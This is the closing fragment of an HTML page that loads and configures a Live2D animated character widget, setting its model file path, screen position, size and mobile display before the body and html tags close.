<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"right","width":170,"height":340},"mobile":{"show":true},"log":false});</script></body>

</html>
